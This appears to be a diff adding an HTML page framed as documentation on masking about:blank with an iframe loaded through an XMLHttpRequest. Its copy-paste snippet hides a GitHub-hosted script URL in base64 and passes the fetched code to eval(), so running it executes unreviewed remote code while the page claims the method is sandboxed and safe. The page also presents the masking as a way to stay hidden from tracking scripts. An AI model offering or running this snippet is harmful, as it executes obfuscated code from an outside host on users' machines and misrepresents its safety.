@@ -1,0 +1,167 @@
+
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Documentation on embedding an iframe via a JavaScript XML request">
+    <meta name="keywords" content="iframe, JavaScript, XML request, about:blank, embedding">
+    <meta name="author" content="Your Name">
+    <meta property="og:title" content="Webpage Masking, Info & XML Request">
+    <meta property="og:description" content="Learn how to embed an iframe dynamically using JavaScript and XML requests.">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://static-00.iconduck.com/assets.00/code-function-icon-512x450-qv61r98f.png">
+    <title>Webpage Masking, Info & XML Request</title>
+    <script src="index.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background-color: #2b2b2b;
+            color: white;
+            padding: 1rem;
+            text-align: center;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: row;
+            height: 100vh;
+        }
+
+        .sidebar {
+            width: 250px;
+            background: #f5f5f5;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .sidebar ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .sidebar ul li a {
+            text-decoration: none;
+            color: #333;
+            display: block;
+            padding: 8px 0;
+        }
+
+        .sidebar ul li a:hover {
+            color: #007bff;
+        }
+
+        .content {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        h2 {
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 5px;
+        }
+
+        /* Syntax highlighting for JavaScript code blocks */
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', monospace;
+        }
+
+        .keyword { color: #ff79c6; }
+        .string { color: #f1fa8c; }
+        .comment { color: #6d7eb2; font-style: italic; }
+        .copy { color: #7084c1; font-weight: bold; cursor: pointer;}
+        .function { color: #50fa7b; }
+        .number { color: #bd93f9; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Webpage Masking, Info & XML Request</h1>
+    </header>
+    <div class="container">
+        <nav class="sidebar">
+            <h2>Contents</h2>
+            <ul>
+                <li><a href="#introduction">Introduction</a></li>
+                <li><a href="#setup">Embedding via JS XML Request</a></li>
+                <li><a href="#usage">Usage</a></li>
+                <li><a href="#api">API Reference</a></li>
+                <li><a href="#faq">FAQ</a></li>
+            </ul>
+        </nav>
+        <main class="content">
+            <section id="introduction">
+                <h2>Masking 'About:Blank'</h2>
+                <h3>How about:blank Works</h3>
+                <p>The about:blank page is a special URL in web browsers that loads a blank, empty document. It is commonly used for security, content manipulation, or placeholder purposes.</p>
+                <p>Using JavaScript, developers can create a controlled environment within about:blank to dynamically manipulate its content. This enables safer data rendering while maintaining isolation from the rest of the page.</p>
+                <p>By embedding an iframe within an about:blank document, you can create an environment that remains hidden from tracking scripts, giving developers the flexibility to insert custom content.</p>
+            </section>
+            <section id="setup">
+                <h2>Embedding an iframe via a JavaScript XML request</h2>
+                <p>Embedding an iframe using JavaScript can be dynamically managed through an XMLHttpRequest (XHR). This approach allows a webpage to fetch external content and embed it inside an iframe dynamically. While XHR is traditionally used for retrieving data asynchronously, it can also be leveraged to insert external pages or HTML fragments inside an iframe.</p>
+                <p>This method can be useful when dealing with remote content that needs to be loaded into a controlled environment. By utilizing an XMLHttpRequest, the external content is retrieved and processed before being embedded, ensuring that the loading process is managed efficiently.</p>
+                <p>When implementing this approach, developers should take security measures to prevent malicious scripts from running within the iframe. This includes setting appropriate Content Security Policy (CSP) headers and ensuring that the fetched content is from a trusted source.</p>
+                <p>The following code is a copy-pastable snippet that you can use to insert an iframe page via an <code>XMLHttpRequest()</code> which will scrape information from a specified module which has a masking function embedded into it which can be called and can mask over an About:Blank page using an iFrame which is placed to overlay the empty page. </p>
+                <pre><code><span class="comment">// XML Request to embed iframe</span>
+req = <span class="keyword">new</span> <span class="function">XMLHttpRequest</span>();
+req.<span class="keyword">open</span>( <span class="string">'GET'</span>, <span class="string">atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hcnpleDA1L3BzeWNoL3JlZnMvaGVhZHMvbWFpbi9mdW5jdEJsYW5rLmpz')</span>); 
+req.<span class="keyword">onload</span> = <span class="function">function</span>() { <span class="keyword">eval</span>(this.<span class="keyword">responseText</span> + <span class="string">'mask();'</span>); };
+req.<span class="keyword">send</span>();
+<span class="copy" id="copy" onclick="copy()">[Copy Code]</span>
+                    </code></pre>
+            </section>
+            <section id="usage">
+                <h2>Usage</h2>
+                <p>Embedding an iframe dynamically using JavaScript and XMLHttpRequest has several practical applications, including:</p>
+                <ul>
+                    <li><b>Loading Dynamic Content</b>: Helps retrieve and display external content within an iframe without requiring a full-page refresh.</li>
+                    <li><b>Overlaying Empty Pages</b>: Used to create overlay components that seamlessly integrate with about:blank pages.</li>
+                    <li><b>Sandboxed Environments</b>: Provides an isolated space for executing scripts, preventing potential security risks associated with running scripts in the main browser environment.</li>
+                    <li><b>Preventing Unintended Redirections</b>: By embedding external pages inside an iframe, users can be kept within the same navigation flow without being redirected away from the current page.</li>
+                    <li><b>Creating Dynamic, Standalone Pages</b>: Enables the generation of standalone popup-like interfaces that can be controlled programmatically.</li>
+                    <li><b>Loading External Content Without Full Page Refresh</b>: Improves user experience by reducing load times and keeping interactions smooth.</li>
+                </ul>
+            </section>
+            <section id="api">
+                <h2>API Reference</h2>
+                <p>The API used for embedding an iframe dynamically includes the following methods:</p>
+                <ul>
+                    <li><b>XMLHttpRequest()</b>: Initiates a request to fetch external content.</li>
+                    <li><b>open(method, url)</b>: Specifies the request type and target URL.</li>
+                    <li><b>onload()</b>: Defines a callback function to execute once the request is complete.</li>
+                    <li><b>send()</b>: Dispatches the request to retrieve the content.</li>
+                </ul>
+            </section>
+            <section id="faq">
+                <h2>FAQ</h2>
+                <p><b>Q: Is it safe to use about:blank for embedding content?</b></p>
+                <p>A: Yes, as long as proper security measures are taken, such as limiting script execution and ensuring the embedded content is from a trusted source.</p>
+                <p><b>Q: Can I use this technique for cross-domain embedding?</b></p>
+                <p>A: Cross-domain restrictions apply when embedding external content. Ensure CORS policies allow the requested content to be retrieved.</p>
+                <p><b>Q: Does embedding an iframe using an XMLHttpRequest affect performance?</b></p>
+                <p>A: If used efficiently, performance impact is minimal. However, excessive use of dynamic requests can slow down page rendering.</p>
+                <p><b>Q: How can I load an iframe only when needed?</b></p>
+                <p>A: You can create an iframe dynamically in JavaScript only when a user interacts with an element (e.g., clicking a button).</p>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
+
